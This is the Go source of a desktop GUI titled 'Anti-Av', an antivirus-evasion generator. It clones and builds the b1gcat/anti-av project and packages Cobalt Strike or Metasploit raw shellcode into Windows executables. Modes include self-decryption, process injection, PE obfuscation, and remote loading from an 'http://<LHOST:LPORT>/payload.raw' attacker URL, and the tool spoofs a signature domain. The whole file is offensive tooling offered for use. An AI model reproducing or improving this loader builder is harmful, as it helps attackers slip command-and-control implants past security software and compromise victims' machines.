package main

import (
	"fmt"
	"os"
	"path/filepath"
	"runtime"
	"strings"

	"fyne.io/fyne/v2"
	"fyne.io/fyne/v2/app"
	"fyne.io/fyne/v2/container"
	"fyne.io/fyne/v2/dialog"
	"fyne.io/fyne/v2/theme"
	"fyne.io/fyne/v2/widget"
	"github.com/b1gcat/anti-av/apps/av/utils"
	"github.com/sirupsen/logrus"

	_ "github.com/lengzhao/font/autoload"
)

var (
	appWindow fyne.App
)

func main() {
	conf := Config{}
	conf.appRun()
}

func (c *Config) appRun() {
	c.appLoader()
	defer c.appQuit()

	win := appWindow.NewWindow("Anti-Av")
	win.SetPadded(false)
	win.SetIcon(theme.LoginIcon())
	win.Resize(fyne.NewSize(600, 300))
	win.Show()
	win.CenterOnScreen()
	win.SetMaster()

	title := widget.NewLabel("免杀生成器")

	arch := widget.NewSelectEntry([]string{"AMD64", "386"})
	arch.SetText("AMD64")

	outputName := widget.NewEntry()
	outputName.SetText("OUTPUT")

	iconSelect := widget.NewSelectEntry([]string{"带图标", "无图标"})
	iconSelect.SetText("带图标")

	signText := widget.NewLabel("签名(域名)")
	sign := widget.NewEntry()
	sign.SetText("baidu.com")
	signBox := container.NewBorder(nil, nil, signText, nil, sign)

	selectEntry := widget.NewSelectEntry([]string{"自解密", "远程加载", "进程注入", "PE文件混淆"})
	selectEntry.SetText("自解密")

	remoteUrlText := widget.NewLabel("远程加载URL")
	remoteUrl := widget.NewEntry()
	remoteUrl.SetText("http://<LHOST:LPORT>/payload.raw")
	remoteUrlBox := container.NewBorder(nil, nil, remoteUrlText, nil, remoteUrl)
	remoteUrlBox.Hide()

	selectEntry.OnChanged = func(a string) {
		switch a {
		case "自解密":
			remoteUrlBox.Hide()
		case "远程加载":
			remoteUrlBox.Show()
		case "进程注入":
			remoteUrlBox.Hide()
		case "PE文件混淆":
			remoteUrlBox.Hide()
		}
	}

	fBtn := widget.NewButton("选择文件(cs或msf的raw格式bin)", nil)

	fBtn.OnTapped = func() {
		fd := dialog.NewFileOpen(func(reader fyne.URIReadCloser, err error) {
			if err != nil {
				dialog.ShowError(err, win)
				return
			}

			if reader == nil {
				return
			}
			defer reader.Close()

			file := reader.URI().Path()
			fBtn.SetText(file)
		}, win)
		fd.Show()
	}

	win.SetOnDropped(func(p fyne.Position, u []fyne.URI) {
		for _, file := range u {
			path := file.Path()

			fs, err := os.Stat(path)
			if err != nil {
				dialog.ShowError(err, win)
				break
			}
			if fs.IsDir() {
				continue
			}
			fBtn.SetText(path)
			return
		}
	})

	btn := widget.NewButtonWithIcon("生成", theme.ConfirmIcon(), nil)
	btn.OnTapped = func() {
		btn.Disable()
		defer btn.Enable()
		suffix := ""
		if runtime.GOOS == "windows" {
			suffix = ".exe"
		}
		runPath, _ := os.Executable()
		runPath = filepath.Join(filepath.Dir(runPath))
		cache := filepath.Join(runPath, "cache")
		os.Mkdir(cache, 0755)
		avDirSrv := filepath.Join(cache, "anti-av")
		avDirSrvAppAv := filepath.Join(avDirSrv, "apps", "av")
		avSrv := "git clone https://github.com/b1gcat/anti-av.git"
		avDirOut := filepath.Join(avDirSrv, "dist")
		appAvBin := filepath.Join(avDirOut, "anti-av"+suffix)

		if _, err := os.Stat(avDirSrv); err != nil {
			logrus.Warn("anti-av不存在, 下载源码:", avSrv)
			err := utils.Cmd(avSrv + " " + avDirSrv)
			logrus.Warnf("Git-result:%v", err)
			if err != nil {
				return
			}
		}
		logrus.Info("Building ", appAvBin)

		err := utils.Cmd("cd " + avDirSrvAppAv + " && " + "go build -o " + appAvBin)
		logrus.Warnf("Build-result:%v", err)
		if err != nil {
			return
		}

		cmd := fmt.Sprintf("-v %s -ho www.%s -arch %s",
			sign.Text, sign.Text, strings.ToLower(arch.Text))
		if iconSelect.Text == "无图标" {
			cmd += " -no-icon"
		}

		logrus.Info("General command:", cmd)
		logrus.Info("开始生成免杀...")
		output := outputName.Text + ".exe"
		switch selectEntry.Text {
		case "进程注入":
			cmd += " -mode inject " + "-o " + output
			fallthrough
		case "自解密":
			err := utils.Cmd("cd " + avDirOut + " && " +
				fmt.Sprintf("%s -p %v %s", appAvBin, fBtn.Text, cmd))
			logrus.Warnf("Generating-result:%v", err)
			if err != nil {
				return
			}
		case "PE文件混淆":
			cmd += " -l pe" + " -o " + output
			err := utils.Cmd("cd " + avDirOut + " && " +
				fmt.Sprintf("%s -p %v %s", appAvBin, fBtn.Text, cmd))
			logrus.Warnf("Generating-result:%v", err)
			if err != nil {
				return
			}
		case "远程加载":
			cmd1 := cmd + " -r " + " -o payload.raw"
			err := utils.Cmd("cd " + avDirOut + " && " +
				fmt.Sprintf("%s -p %v %s", appAvBin, fBtn.Text, cmd1))
			logrus.Warnf("Generating-result:%v", err)
			if err != nil {
				return
			}

			cmd += " -o " + output
			err = utils.Cmd("cd " + avDirOut + " && " +
				fmt.Sprintf("%s -p '%v' %s", appAvBin, remoteUrl.Text, cmd))
			logrus.Warnf("Generating-result:%v", err)
			if err != nil {
				return
			}
			logrus.Warnf("Generating-result:%v", err)
			if err != nil {
				return
			}
		}
		if selectEntry.Text == "远程加载" {
			os.Rename(filepath.Join(avDirOut, "payload.raw"), filepath.Join(runPath, "payload.raw"))
			logrus.Infof("输出文件: %s", filepath.Join(runPath, "payload.raw"))
		}
		os.Rename(filepath.Join(avDirOut, output), filepath.Join(runPath, output))
		logrus.Infof("输出文件: %s", filepath.Join(runPath, output))
		os.RemoveAll(avDirOut)
		logrus.Info("完成")
	}

	content := container.NewVBox(
		title,
		arch,
		outputName,
		iconSelect,
		signBox,
		selectEntry,
		remoteUrlBox,
		fBtn,
		btn,
	)
	win.SetContent(content)

	appWindow.Run()
}

func (c *Config) appLoader() {
	if appWindow == nil {
		appWindow = app.NewWithID("com.b1gcat.av.ui")
		appWindow.Settings().SetTheme(theme.LightTheme())
		appWindow.SetIcon(theme.ColorAchromaticIcon())
	}
}

func (c *Config) appQuit() {
	appWindow.Quit()
}
